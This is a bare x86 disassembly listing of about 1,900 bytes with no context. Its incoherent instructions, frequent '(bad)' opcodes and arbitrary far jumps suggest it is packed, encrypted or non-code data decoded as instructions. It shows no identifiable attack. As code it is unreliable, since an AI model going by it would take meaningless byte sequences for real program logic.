  410c4a:	sub    BYTE PTR [edx-0x29],ah
  410c4d:	bound  ebp,QWORD PTR [ebp+esi*1-0x495a2556]
  410c54:	cld    
  410c55:	jmp    0xb4720c8a
  410c5a:	stos   DWORD PTR es:[edi],eax
  410c5b:	jecxz  0x410c22
  410c5d:	mov    bh,dh
  410c5f:	in     al,dx
  410c60:	fwait
  410c61:	mov    ds:0x3da4d851,al
  410c66:	jo     0x410cc6
  410c68:	xor    al,0x77
  410c6a:	dec    esi
  410c6b:	mov    edx,0x956c1535
  410c70:	xchg   esi,eax
  410c71:	sbb    eax,0x26e4e6ff
  410c76:	adc    eax,0xb7a9adb7
  410c7b:	xor    DWORD PTR [ecx-0x39],0xbadebfad
  410c82:	shl    BYTE PTR [esi+0x58818536],1
  410c88:	inc    eax
  410c89:	cli    
  410c8a:	pop    ecx
  410c8b:	sub    BYTE PTR [eax],ah
  410c8d:	(bad)  
  410c8e:	lea    ecx,[ebp+0x3546d806]
  410c94:	mov    ebx,0x7b602753
  410c99:	push   esp
  410c9a:	ins    BYTE PTR es:[edi],dx
  410c9b:	pop    ss
  410c9c:	mov    dh,0xfc
  410c9e:	sub    DWORD PTR [edx-0x2567448a],eax
  410ca4:	inc    BYTE PTR [esi]
  410ca6:	add    dh,BYTE PTR gs:[esi]
  410ca9:	push   cx
  410cab:	(bad)  
  410cac:	pop    ds
  410cad:	push   cs
  410cae:	mov    dh,0xaf
  410cb0:	outs   dx,BYTE PTR ds:[esi]
  410cb1:	fistp  DWORD PTR [ebx+eiz*1]
  410cb4:	jge    0x410c7e
  410cb6:	fmul   QWORD PTR [edi]
  410cb8:	pop    DWORD PTR [eax+0x605dd96b]
  410cbe:	fistp  DWORD PTR [edx-0x24]
  410cc1:	popa   
  410cc2:	addr16 sahf 
  410cc4:	adc    BYTE PTR [eax],al
  410cc6:	mov    esi,gs
  410cc8:	pop    ebx
  410cc9:	and    BYTE PTR [ebp+esi*4+0x5f],bl
  410ccd:	add    al,0xbe
  410ccf:	loop   0x410c6e
  410cd1:	mov    bl,0xdb
  410cd3:	fidiv  DWORD PTR [esi+0x61]
  410cd6:	push   ds
  410cd7:	(bad)  
  410cd8:	int3   
  410cd9:	or     eax,0xe956e9bf
  410cde:	xchg   ecx,eax
  410cdf:	aam    0x8a
  410ce1:	sbb    eax,0x23b66dd0
  410ce6:	mov    ch,0xfb
  410ce8:	cli    
  410ce9:	cdq    
  410cea:	clc    
  410ceb:	mov    dh,0x75
  410ced:	add    al,0x6c
  410cef:	jbe    0x410d4a
  410cf1:	sub    ecx,0xffffffd2
  410cf4:	sbb    edi,0x56
  410cf7:	scas   al,BYTE PTR es:[edi]
  410cf8:	mov    eax,0x9d84edb5
  410cfd:	sahf   
  410cfe:	jle    0x410cb0
  410d00:	xchg   BYTE PTR [edx-0x5e8e8d96],dh
  410d06:	jno    0x410cab
  410d08:	jmp    0x410d29
  410d0a:	push   0x3e612adb
  410d0f:	jle    0x410d48
  410d11:	mov    esi,0xee4bcb8
  410d16:	add    cl,dl
  410d18:	repz imul ebx,ebx,0xffbb7b26
  410d1f:	fisubr DWORD PTR [esi+0x4b]
  410d22:	in     eax,0x0
  410d24:	hlt    
  410d25:	arpl   WORD PTR [ebp+0x73],sp
  410d28:	or     BYTE PTR [ebp+ebx*8+0x5b6d3eb9],0xe1
  410d30:	push   esi
  410d31:	ficomp DWORD PTR [eax-0x40b37b05]
  410d37:	add    eax,0xbb617e74
  410d3c:	mov    al,0xb1
  410d3e:	imul   edi,DWORD PTR [edx+0x6c],0xd
  410d42:	fistp  QWORD PTR [eax+0x498974e4]
  410d48:	mov    eax,ds:0xe6500a15
  410d4d:	cli    
  410d4e:	pop    ds
  410d4f:	fisttp WORD PTR [ebx]
  410d51:	dec    ebx
  410d52:	sbb    ebp,DWORD PTR [ebp-0x40]
  410d55:	push   cs
  410d56:	or     al,0x34
  410d58:	retf   
  410d59:	mov    ds:0x146da555,eax
  410d5e:	ins    DWORD PTR es:[edi],dx
  410d5f:	mov    ah,0x73
  410d61:	sahf   
  410d62:	in     al,0x64
  410d64:	push   edx
  410d65:	loop   0x410d14
  410d67:	ins    DWORD PTR es:[edi],dx
  410d68:	pop    esp
  410d69:	mov    al,ds:0x5fb03c08
  410d6e:	dec    esi
  410d6f:	shl    DWORD PTR [edx],cl
  410d71:	out    dx,eax
  410d72:	sbb    eax,0x4bda3705
  410d77:	sbb    dl,0xc
  410d7a:	rcr    ebp,0x8a
  410d7d:	aas    
  410d7e:	mov    cl,0xb4
  410d80:	ins    DWORD PTR es:[edi],dx
  410d81:	lea    ebp,[ecx-0x73c51ca6]
  410d87:	xchg   esi,eax
  410d88:	add    eax,0x1b6b6d2b
  410d8d:	mov    cl,0x93
  410d8f:	retf   0x2c41
  410d92:	loopne 0x410d9f
  410d94:	sahf   
  410d95:	dec    ebx
  410d96:	and    DWORD PTR [eax+0x22],ebx
  410d99:	mov    dh,0xdf
  410d9b:	pop    esp
  410d9c:	xor    dl,0x61
  410d9f:	shl    DWORD PTR [eax],1
  410da1:	mov    dh,0x8d
  410da3:	lods   eax,DWORD PTR ds:[esi]
  410da4:	jo     0x410d50
  410da6:	imul   DWORD PTR [eax+0x29077d5b]
  410dac:	call   0x4813e477
  410db1:	jb     0x410dda
  410db3:	and    al,0xb4
  410db5:	retf   
  410db6:	ror    BYTE PTR [eax-0x5772495b],1
  410dbc:	mov    bl,0x38
  410dbe:	or     ecx,DWORD PTR [ecx-0x44bae97d]
  410dc4:	mov    al,ds:0xcadd4b36
  410dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dca:	inc    ebx
  410dcb:	shl    DWORD PTR [esi+0x6b],0xf8
  410dcf:	add    al,0xd4
  410dd1:	test   ebx,esp
  410dd3:	push   ss
  410dd4:	push   ebp
  410dd5:	mov    ebx,0xf45b5bb5
  410dda:	sbb    eax,0x8815d98f
  410ddf:	das    
  410de0:	add    al,BYTE PTR [edi+0x64]
  410de3:	fisubr DWORD PTR [esi]
  410de5:	ins    BYTE PTR es:[edi],dx
  410de6:	dec    ebx
  410de7:	gs pop sp
  410dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410deb:	cwde   
  410dec:	inc    esp
  410ded:	scas   eax,DWORD PTR es:[edi]
  410dee:	mov    bh,BYTE PTR [edx+0x3620e8a3]
  410df4:	rcl    bh,0x15
  410df7:	pop    edx
  410df8:	jge    0x410e2e
  410dfa:	push   esp
  410dfb:	or     eax,DWORD PTR [ebp-0x7f]
  410dfe:	xor    bh,bl
  410e00:	out    0x5d,al
  410e02:	pop    eax
  410e03:	sub    BYTE PTR [eax+edi*1+0xa],al
  410e07:	mov    ebp,0xd2e0cbdc
  410e0c:	push   esi
  410e0d:	test   al,0xad
  410e0f:	mov    WORD PTR [edi+0x9],es
  410e12:	push   ebp
  410e13:	and    dh,al
  410e15:	sub    DWORD PTR [edi],edx
  410e17:	shr    DWORD PTR [esi+0x62cb2de0],0x1d
  410e1e:	mov    ecx,edx
  410e20:	scas   al,BYTE PTR es:[edi]
  410e21:	mov    BYTE PTR [ebx+0x6b],bl
  410e24:	int    0x9c
  410e26:	pop    ebx
  410e27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e28:	mov    ebp,0x6a5dd2d
  410e2d:	fisubr DWORD PTR [eax-0x3794c093]
  410e33:	dec    esp
  410e34:	xchg   BYTE PTR [esi+0x2eaddad8],dl
  410e3a:	jg     0x410e01
  410e3c:	and    cl,BYTE PTR [ebp+0x26]
  410e3f:	mov    ch,0x34
  410e41:	loop   0x410ea3
  410e43:	(bad)  [esi]
  410e45:	mov    dh,0x91
  410e47:	loope  0x410dd9
  410e49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e4a:	out    dx,eax
  410e4b:	ins    DWORD PTR es:[edi],dx
  410e4c:	jecxz  0x410e57
  410e4e:	inc    ebp
  410e4f:	mov    ah,0x1b
  410e51:	or     eax,0xe771bace
  410e56:	out    dx,eax
  410e57:	or     dh,ch
  410e59:	lds    ebp,FWORD PTR [ebp+0x35a09e1f]
  410e5f:	test   BYTE PTR [esi-0x75],bh
  410e62:	not    al
  410e64:	lods   eax,DWORD PTR ds:[esi]
  410e65:	fld    QWORD PTR [edi+0x6d]
  410e68:	pusha  
  410e69:	cmp    edx,edi
  410e6b:	popf   
  410e6c:	and    DWORD PTR [edi],ebp
  410e6e:	stc    
  410e6f:	out    0x50,eax
  410e71:	dec    ebx
  410e72:	mov    ah,0xdb
  410e74:	dec    ebp
  410e75:	push   ebx
  410e76:	sbb    al,0xee
  410e78:	pop    edi
  410e79:	adc    BYTE PTR [ebx],ah
  410e7b:	mov    eax,ds:0xde2c6b74
  410e80:	jnp    0x410e69
  410e82:	cmc    
  410e83:	sub    esp,ecx
  410e85:	or     BYTE PTR [eax+0x6d85a5b6],bh
  410e8b:	mov    bh,0xf8
  410e8d:	push   ebx
  410e8e:	(bad)  
  410e8f:	and    eax,0x677dbc12
  410e94:	stos   DWORD PTR es:[edi],eax
  410e95:	bound  ebp,QWORD PTR [ebx-0x23]
  410e98:	cmp    BYTE PTR [ebx+edi*1-0x12],ah
  410e9c:	mov    DWORD PTR [ebx+0xbb62399],esp
  410ea2:	pop    ebx
  410ea3:	das    
  410ea4:	or     al,0x40
  410ea6:	and    ah,BYTE PTR [eax-0x4810b4f5]
  410eac:	(bad)  
  410ead:	jbe    0x410e5a
  410eaf:	ins    DWORD PTR es:[edi],dx
  410eb0:	loop   0x410f1e
  410eb2:	imul   cl
  410eb4:	mov    edi,ecx
  410eb6:	add    ebx,0xffffffc4
  410eb9:	lea    esi,[esi-0x25]
  410ebc:	push   0x805122c
  410ec1:	xchg   ebp,eax
  410ec2:	push   ss
  410ec3:	mov    dh,0x3f
  410ec5:	(bad)  
  410ec6:	fist   DWORD PTR [esi]
  410ec8:	ficom  DWORD PTR ds:0x1f9ad16e
  410ece:	xor    dl,BYTE PTR [eax+0x6d51489b]
  410ed4:	test   eax,0x225003d8
  410ed9:	add    dh,BYTE PTR [edx+ebp*8+0x46]
  410edd:	adc    esi,DWORD PTR [ecx+0x19ef1dd5]
  410ee3:	in     eax,dx
  410ee4:	stos   BYTE PTR es:[edi],al
  410ee5:	mov    fs,WORD PTR [ecx+0x6b]
  410ee8:	pop    ss
  410ee9:	clc    
  410eea:	fst    QWORD PTR [eax-0x640a5161]
  410ef0:	or     BYTE PTR [edi-0x5e969cf3],dh
  410ef6:	je     0x410f05
  410ef8:	stc    
  410ef9:	sub    edx,esp
  410efb:	fnstenv [edi+0x60]
  410efe:	xchg   ebx,eax
  410eff:	retf   
  410f00:	(bad)  
  410f01:	shl    BYTE PTR [esi+0x20],cl
  410f04:	arpl   WORD PTR [esi+eax*8-0x7aea6b],sp
  410f0b:	dec    esp
  410f0c:	mov    dh,0x1a
  410f0e:	push   0x5388e94b
  410f13:	jb     0x410eeb
  410f15:	jmp    0x410eac
  410f17:	ins    DWORD PTR es:[edi],dx
  410f18:	dec    ebx
  410f19:	pop    ebx
  410f1a:	(bad)  ds:0xa4473bdb
  410f20:	pop    ss
  410f21:	call   0x2db9:0x6d1ba8b3
  410f28:	sub    al,0x1e
  410f2a:	push   ebx
  410f2b:	inc    ebp
  410f2c:	pop    ds
  410f2d:	fidiv  DWORD PTR [eax+0x2db46e7e]
  410f33:	call   0x4a9245c3
  410f38:	cmc    
  410f39:	std    
  410f3a:	push   eax
  410f3b:	push   ecx
  410f3c:	mov    eax,0x4786c2d
  410f41:	cs (bad) 
  410f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f44:	test   al,0xcd
  410f46:	mov    ch,ah
  410f48:	fcmovnbe st,st(6)
  410f4a:	push   es
  410f4b:	mov    edx,0x2971b2eb
  410f50:	dec    edx
  410f51:	add    BYTE PTR ds:0x1b6d2eaf,al
  410f57:	or     esp,DWORD PTR [ecx-0x47]
  410f5a:	jnp    0x410fa7
  410f5c:	sbb    eax,0x6cea921b
  410f61:	fist   DWORD PTR [esi-0x1d]
  410f64:	(bad)  
  410f65:	(bad)  
  410f66:	cmp    esi,DWORD PTR [edi-0x61]
  410f69:	xor    BYTE PTR [ebp+0x6deba4e5],dh
  410f6f:	sbb    eax,DWORD PTR [eax]
  410f71:	outs   dx,BYTE PTR ds:[esi]
  410f72:	das    
  410f73:	adc    DWORD PTR [edx+ecx*8-0x13],0x5c
  410f78:	(bad)  
  410f79:	fbstp  TBYTE PTR [esi]
  410f7b:	mov    edx,0x4841a058
  410f80:	jecxz  0x410ffd
  410f82:	in     eax,dx
  410f83:	cmp    al,0xe2
  410f85:	adc    esi,DWORD PTR [ecx-0x15]
  410f88:	sub    ch,BYTE PTR [edi+0x36]
  410f8b:	inc    edi
  410f8c:	outs   dx,BYTE PTR ds:[esi]
  410f8d:	pushf  
  410f8e:	gs cs ins BYTE PTR es:[edi],dx
  410f91:	test   DWORD PTR [ebp+0x52],ebp
  410f94:	inc    ebp
  410f95:	ja     0x410fab
  410f97:	pop    ebx
  410f98:	sbb    ah,BYTE PTR [esi-0x45fe0512]
  410f9e:	or     BYTE PTR [esi],ch
  410fa0:	adc    al,0x49
  410fa2:	add    al,0xb3
  410fa4:	push   edi
  410fa5:	push   esi
  410fa6:	or     DWORD PTR [eax-0x59fe9f5f],esp
  410fac:	sub    al,0x25
  410fae:	leave  
  410faf:	jmp    0xf573:0xf38956c6
  410fb6:	int3   
  410fb7:	jbe    0x411017
  410fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fba:	lea    ebp,[ebp-0x65f15372]
  410fc0:	das    
  410fc1:	jmp    0xda2d:0xdb0b1749
  410fc8:	push   ss
  410fc9:	call   0xe8a1:0x5d632d7d
  410fd0:	xor    al,0xa
  410fd2:	(bad)  
  410fd3:	add    al,0x70
  410fd5:	imul   eax,DWORD PTR [edx],0xffffffe0
  410fd8:	mov    ecx,0x3ef8925f
  410fdd:	mov    ebx,0x67ea1845
  410fe2:	sbb    al,0xeb
  410fe4:	shr    BYTE PTR [ebx+0x6c2c958f],1
  410fea:	in     eax,dx
  410feb:	push   edx
  410fec:	cmp    BYTE PTR ds:0x19e89b1,cl
  410ff2:	(bad)  
  410ff3:	not    al
  410ff5:	cs sub al,0x2c
  410ff8:	pop    ds
  410ff9:	xor    al,0x1
  410ffb:	outs   dx,DWORD PTR ds:[esi]
  410ffc:	xor    DWORD PTR [esi+edx*4-0x50],ebx
  411000:	gs jmp 0x411045
  411003:	mov    ebx,0x32ea1794
  411008:	mov    dl,0xdd
  41100a:	shr    bl,0x89
  41100d:	cs mov eax,0x12e96db4
  411013:	mov    WORD PTR [eax],ds
  411015:	cwde   
  411016:	pop    ebx
  411017:	int    0x1f
  411019:	mov    cl,0xdc
  41101b:	fidiv  DWORD PTR [esi-0x226ff12b]
  411021:	xor    al,0x2e
  411023:	xchg   ebp,eax
  411024:	sbb    eax,0xdb6a7c0d
  411029:	inc    eax
  41102a:	imul   DWORD PTR [esi-0x96c0d81]
  411030:	sub    ch,al
  411032:	mov    dh,0x6d
  411034:	xor    al,0x10
  411036:	ja     0x41103e
  411038:	or     DWORD PTR [eax-0x2c],esp
  41103b:	(bad)  
  41103c:	push   cs
  41103d:	sbb    dl,BYTE PTR [ecx]
  41103f:	fcmovnbe st,st(2)
  411041:	and    ebp,ebx
  411043:	sbb    bl,BYTE PTR [edx]
  411045:	cmp    eax,0x10d1d0a3
  41104a:	fisttp QWORD PTR [eax]
  41104c:	adc    al,ah
  41104e:	jbe    0x41107b
  411050:	cmp    al,0xc6
  411052:	mov    eax,0xd0be50b0
  411057:	add    al,0x0
  411059:	in     al,0x5f
  41105b:	test   eax,0xa5c2a37f
  411060:	fcmovnbe st,st(6)
  411062:	mov    dh,0x55
  411064:	jns    0x411021
  411066:	call   0x332c:0x94f702cb
  41106d:	aam    0xad
  41106f:	add    al,0xb5
  411071:	ja     0x411041
  411073:	dec    esi
  411074:	pop    ss
  411075:	pop    ebp
  411076:	mov    ecx,0x746dbb4
  41107b:	stc    
  41107c:	push   ds
  41107d:	call   DWORD PTR ds:0x1a0c380b
  411083:	mov    dh,0xb1
  411085:	sub    eax,0xf24ddf2d
  41108a:	cli    
  41108b:	and    BYTE PTR [esi],bh
  41108d:	cmp    al,0xe8
  41108f:	mov    esp,0xc02a0d6d
  411094:	pop    eax
  411095:	call   0x46660028
  41109a:	mov    ch,0xb4
  41109c:	sub    eax,0xca78911
  4110a1:	cwde   
  4110a2:	sbb    eax,0x1a2eb655
  4110a7:	fstp   TBYTE PTR [eax-0x2715ed50]
  4110ad:	ins    DWORD PTR es:[edi],dx
  4110ae:	lods   eax,DWORD PTR ds:[esi]
  4110af:	mov    esp,0xdb52d2d2
  4110b4:	lds    edx,FWORD PTR [ebp-0x71c5298]
  4110ba:	cld    
  4110bb:	jecxz  0x41109a
  4110bd:	fdivr  DWORD PTR [edx-0x343e6d18]
  4110c3:	and    eax,0xb190d277
  4110c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110c9:	jbe    0x41112e
  4110cb:	popa   
  4110cc:	mov    eax,ds:0x67118208
  4110d1:	mov    ?,WORD PTR [esi+ebx*2-0x7d69a94c]
  4110d8:	xchg   esi,eax
  4110d9:	mov    dh,0x6e
  4110db:	push   edx
  4110dc:	push   eax
  4110dd:	test   BYTE PTR [ecx-0x492497e9],bh
  4110e3:	add    ebx,DWORD PTR [ecx+0x6220b7b5]
  4110e9:	into   
  4110ea:	adc    al,0x7a
  4110ec:	in     eax,dx
  4110ed:	push   edx
  4110ee:	inc    ebx
  4110ef:	ffree  st(3)
  4110f1:	fild   QWORD PTR [edx]
  4110f3:	fist   WORD PTR [esi]
  4110f5:	jmp    0x85615873
  4110fa:	dec    ebx
  4110fb:	or     ebx,DWORD PTR [ebx]
  4110fd:	xchg   ebx,eax
  4110fe:	push   0xffffffbe
  411100:	and    BYTE PTR [ebx-0x44],ch
  411103:	adc    edi,DWORD PTR [edi+0x1a]
  411106:	mov    ds:0xeff40b6e,al
  41110b:	pop    ss
  41110c:	dec    ecx
  41110d:	xchg   BYTE PTR [ebx+0xd],ah
  411110:	or     ebx,DWORD PTR [ebx+0x61]
  411113:	sub    ecx,esi
  411115:	lods   al,BYTE PTR ds:[esi]
  411116:	cs jno 0x411142
  411119:	dec    edi
  41111a:	in     eax,dx
  41111b:	ins    DWORD PTR es:[edi],dx
  41111c:	mov    bh,0x86
  41111e:	test   al,0x7d
  411120:	adc    eax,0xe8cb5c70
  411125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411126:	adc    BYTE PTR [ebx+0x17],bl
  411129:	je     0x411196
  41112b:	jmp    0x4110b9
  41112d:	das    
  41112e:	shl    DWORD PTR [ebx-0x57e246ee],0xd
  411135:	call   0x51b9:0x490079aa
  41113c:	arpl   WORD PTR [ebx+0x0],bp
  41113f:	push   ss
  411140:	sbb    esi,DWORD PTR [edi-0x31]
  411143:	mov    al,0x4a
  411145:	rcr    BYTE PTR [edx+0x75],0x11
  411149:	fld    TBYTE PTR [ebp+0x56]
  41114c:	add    ch,BYTE PTR [eax]
  41114e:	jb     0x4111bb
  411150:	sub    DWORD PTR ds:0xc2ed15a7,ecx
  411156:	mov    dh,0x32
  411158:	xchg   esi,eax
  411159:	or     BYTE PTR [ebx],bh
  41115b:	adc    BYTE PTR [ebx-0x3a],ah
  41115e:	sbb    eax,0xb11c836
  411163:	test   al,0x6c
  411165:	pop    ecx
  411166:	dec    ecx
  411167:	jns    0x4111c5
  411169:	fdiv   DWORD PTR [esi]
  41116b:	ss adc eax,0xddca54af
  411171:	hlt    
  411172:	inc    ebx
  411173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411174:	dec    eax
  411175:	fnsave [esi-0x108d493]
  41117b:	into   
  41117c:	retf   
  41117d:	cmp    al,0x68
  41117f:	(bad)  [ecx+ebp*1-0x75aab4a1]
  411186:	lods   eax,DWORD PTR ds:[esi]
  411187:	cmp    edx,DWORD PTR [edi]
  411189:	call   0x346d:0xb206353d
  411190:	inc    eax
  411191:	into   
  411192:	cmp    al,0x2a
  411194:	jne    0x4111f2
  411196:	pop    es
  411197:	sub    eax,0x19db041a
  41119c:	push   esi
  41119d:	xchg   DWORD PTR [esi+0x48],ebx
  4111a0:	pop    eax
  4111a1:	mov    al,ds:0x5b2b6dd
  4111a6:	cli    
  4111a7:	gs fsubr st,st(3)
  4111aa:	pop    ss
  4111ab:	push   ecx
  4111ac:	fwait
  4111ad:	lods   eax,DWORD PTR ds:[esi]
  4111ae:	jbe    0x41115b
  4111b0:	pop    ebp
  4111b1:	sub    BYTE PTR [esi+0x22],al
  4111b4:	jno    0x411150
  4111b6:	jbe    0x411162
  4111b8:	in     al,dx
  4111b9:	pop    ds
  4111ba:	pusha  
  4111bb:	mov    eax,ds:0xb65cb6dd
  4111c0:	pop    ebp
  4111c1:	fiadd  DWORD PTR [ecx]
  4111c3:	fcomp  DWORD PTR [ecx+0x55]
  4111c6:	mov    ecx,0xdd01d850
  4111cb:	stos   BYTE PTR es:[edi],al
  4111cc:	xchg   ebx,eax
  4111cd:	push   0xffffffbe
  4111cf:	cld    
  4111d0:	add    esi,DWORD PTR [ebx-0x5d]
  4111d3:	fstp   QWORD PTR [eax+0x30]
  4111d6:	jmp    0x35b7:0xf6279f5e
  4111dd:	in     al,0x36
  4111df:	cs jge 0x411253
  4111e2:	popf   
  4111e3:	or     DWORD PTR [edi],0x31d9056e
  4111e9:	add    ebp,DWORD PTR [edx+0x1adb6d8]
  4111ef:	sub    BYTE PTR [ebx+0x62],dl
  4111f2:	mov    ds:0xa6da3def,al
  4111f7:	pop    ebx
  4111f8:	add    esi,DWORD PTR [ebp-0x530298a4]
  4111fe:	and    al,0x90
  411200:	loopne 0x4111e8
  411202:	fwait
  411203:	ins    DWORD PTR es:[edi],dx
  411204:	inc    eax
  411205:	mov    ah,0x5b
  411207:	mov    eax,0x688cf9bc
  41120c:	dec    ecx
  41120d:	pop    edx
  41120e:	mov    eax,0x25f2a17c
  411213:	pop    ebx
  411214:	dec    esi
  411215:	add    BYTE PTR [ecx],dh
  411217:	mov    ebp,0xdb04b227
  41121c:	sub    BYTE PTR [edx+0x28],ch
  41121f:	cwde   
  411220:	mov    DWORD PTR [ebx],ebp
  411222:	call   0x3156:0xd1068538
  411229:	jmp    0xb636:0xdd6a6a41
  411230:	ffreep st(2)
  411232:	adc    ch,0xb6
  411235:	dec    edx
  411236:	sbb    edx,DWORD PTR [edx+0x636ddaaf]
  41123c:	pop    ebx
  41123d:	fld    QWORD PTR [ebx-0x32]
  411240:	or     ch,BYTE PTR [ebx+0x69f1fe8b]
  411246:	adc    DWORD PTR [eax+0x2dc05d],esp
  41124c:	fiadd  DWORD PTR [ebx]
  41124e:	mov    ebp,0x68251cc5
  411253:	pop    ebx
  411254:	push   0xfffffff2
  411256:	rcl    DWORD PTR [ebp+0x78d638c0],1
  41125c:	pop    ss
  41125d:	dec    ebp
  41125e:	xchg   esp,eax
  41125f:	test   DWORD PTR [esi],esp
  411261:	sbb    DWORD PTR [eax+0x17184216],ecx
  411267:	rol    BYTE PTR [esi-0x29],0x54
  41126b:	fs cmp ecx,ecx
  41126e:	out    dx,eax
  41126f:	dec    esp
  411270:	(bad)  
  411271:	in     eax,0xed
  411273:	inc    edx
  411274:	clc    
  411275:	pop    es
  411276:	inc    eax
  411277:	jge    0x41120b
  411279:	adc    al,BYTE PTR [eax]
  41127b:	pop    ebp
  41127c:	out    dx,eax
  41127d:	or     edi,ebx
  41127f:	lea    ecx,ds:0xbfe6d2c1
  411285:	sub    BYTE PTR [edi],0x50
  411288:	jne    0x41127d
  41128a:	fdiv   DWORD PTR [esi+0x3f885b1b]
  411290:	daa    
  411291:	div    edx
  411293:	lods   eax,DWORD PTR es:[esi]
  411295:	add    bh,BYTE PTR [ebx+0x50bb608e]
  41129b:	jae    0x411228
  41129d:	ins    BYTE PTR es:[edi],dx
  41129e:	pop    eax
  41129f:	imul   ebx,DWORD PTR [edx+0x46],0x4d
  4112a3:	add    al,0x37
  4112a5:	mov    dh,0x85
  4112a7:	inc    esp
  4112a8:	cmp    ecx,edi
  4112aa:	aam    0xfc
  4112ac:	scas   al,BYTE PTR es:[edi]
  4112ad:	aam    0x5b
  4112af:	mov    ebx,0x9ffe6c6d
  4112b4:	jb     0x4112e1
  4112b6:	adc    DWORD PTR [edx+0x6f],ebp
  4112b9:	sahf   
  4112ba:	pop    edi
  4112bb:	mov    ds:0x452c3885,al
  4112c0:	out    0x68,al
  4112c2:	mov    esi,0xda971151
  4112c7:	lods   eax,DWORD PTR ds:[esi]
  4112c8:	ror    DWORD PTR ds:0xd7ce0522,0xd8
  4112cf:	retf   0xb6c2
  4112d2:	ins    DWORD PTR es:[edi],dx
  4112d3:	dec    ebp
  4112d4:	or     DWORD PTR [esi-0x17],ecx
  4112d7:	sub    al,0x23
  4112d9:	daa    
  4112da:	je     0x41127c
  4112dc:	and    eax,0xdb4b5c37
  4112e1:	sbb    DWORD PTR [ebx-0x5ce9bb1e],0x6154a7c3
  4112eb:	test   eax,0xc83e6d6d
  4112f0:	cli    
  4112f1:	shl    esi,1
  4112f3:	add    eax,0xa95bcab1
  4112f8:	xchg   esi,eax
  4112f9:	jg     0x411311
  4112fb:	fwait
  4112fc:	add    dh,cl
  4112fe:	in     eax,0x0
  411300:	add    ebp,DWORD PTR [edi]
  411302:	mov    eax,ds:0xbad8767d
  411307:	test   al,0xb
  411309:	dec    ecx
  41130a:	call   0x11fd5896
  41130f:	ins    DWORD PTR es:[edi],dx
  411310:	test   al,0xd
  411312:	inc    ecx
  411313:	pop    ebp
  411314:	and    eax,0x78bfa68e
  411319:	pop    ds
  41131a:	outs   dx,BYTE PTR ds:[esi]
  41131b:	mov    al,0x1
  41131d:	cmp    BYTE PTR [edi+eiz*4-0x177061f6],ah
  411324:	xor    eax,0x71d156d4
  411329:	adc    bl,BYTE PTR [ebx+0x3d]
  41132c:	adc    eax,0xb85a08ec
  411331:	xchg   ah,bl
  411333:	fnstsw WORD PTR [edi+ebx*1+0x18]
  411337:	loopne 0x4112bd
  411339:	(bad)  
  41133a:	inc    ebp
  41133b:	jo     0x4113a8
  41133d:	jle    0x4113ad
  41133f:	pop    eax
  411340:	sar    BYTE PTR [ebp+0x52],cl
  411343:	es inc ebx
  411345:	jne    0x4112ea
  411347:	stos   DWORD PTR es:[edi],eax
  411348:	(bad)  
  411349:	popa   
  41134a:	add    esp,DWORD PTR [ebx-0x47]
  41134d:	jge    0x41130f
  41134f:	test   DWORD PTR [esi],ecx
  411351:	push   0x3
  411353:	push   eax
  411354:	ret    0x196b
  411357:	pop    esi
  411358:	mov    cl,0x28
  41135a:	adc    al,0x6d
  41135c:	adc    edx,DWORD PTR [edx-0x2dbee888]
  411362:	sbb    ebp,DWORD PTR [ebp+0x76508d0b]
  411368:	dec    ebp
  411369:	popa   
  41136a:	call   0xdba04568
  41136f:	lods   eax,DWORD PTR ds:[esi]
  411370:	adc    al,0x4f
  411372:	imul   esp,DWORD PTR [ecx-0x65f72b27],0xffffff86
  411379:	sub    ebp,ebp
  41137b:	add    cl,BYTE PTR [eax+0x3cb9e86c]
  411381:	sub    al,0x74
  411383:	jo     0x4113f0
  411385:	retf   
  411386:	jbe    0x411336
  411388:	test   eax,0xceaccd11
  41138d:	or     BYTE PTR [esi-0x25ff9b20],dl
  411393:	push   eax
  411394:	mov    ds,WORD PTR [ecx+0x7d]
  411397:	aam    0x3f
  411399:	mov    eax,0xd319a144
  41139e:	or     eax,0xf13874fb
  4113a3:	js     0x41132a
  4113a5:	mov    dh,0x5d
  4113a7:	push   0xbc3f28e3
  4113ac:	xchg   edx,eax
  4113ad:	cmpxchg BYTE PTR ds:0x85ad85d6,ah
  4113b4:	repnz add DWORD PTR [esi-0x76231581],esp
  4113bb:	leave  
  4113bc:	cli    
  4113bd:	cs xor al,0x0
  4113c0:	mov    dh,0x4a
  4113c2:	inc    esi
  4113c3:	ss popa 
  4113c5:	pushf  
  4113c6:	in     al,0x4d
  4113c8:	shl    BYTE PTR [esi+0x2f0f5421],1
  4113ce:	dec    ebp
  4113cf:	and    al,0xab
  4113d1:	jo     0x411389
  4113d3:	fcmovnbe st,st(6)
  4113d5:	mov    dh,0x94
  4113d7:	sub    DWORD PTR ds:0xec8174ad,ebx
  4113dd:	hlt    
  4113de:	scas   eax,DWORD PTR es:[edi]
  4113df:	mov    esp,0x81adc46
  4113e4:	push   ss
  4113e5:	xchg   ecx,eax
  4113e6:	dec    esp
  4113e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113e8:	xor    DWORD PTR [esi+ebp*2+0x742c45cd],ecx
  4113ef:	push   ebp
  4113f0:	dec    eax
  4113f1:	push   ds
  4113f2:	pop    es
  4113f3:	xchg   ecx,eax
  4113f4:	je     0x411459
  4113f6:	imul   ebp,DWORD PTR [ebx+0x47],0x23
  4113fa:	add    eax,0xcf8d8864
  4113ff:	push   ebp
  411400:	inc    edi
  411401:	jo     0x411464
  411403:	test   eax,0xac735cdd
  411408:	shl    DWORD PTR [edi+0x1c],0xdb
  41140c:	inc    edx
  41140d:	mov    ebx,0x4aedf445
  411412:	or     DWORD PTR [eax+0x320e218b],eax
  411418:	sub    BYTE PTR [esi],ch
  41141a:	ins    BYTE PTR es:[edi],dx
  41141b:	mov    ah,0x27
  41141d:	sbb    dh,BYTE PTR [edx-0x14]
  411420:	jg     0x41149b
  411422:	adc    edx,DWORD PTR [ecx-0x23]
  411425:	or     bh,BYTE PTR [ebx-0x55df106]
  41142b:	mov    eax,ds:0xb6ed6dfb
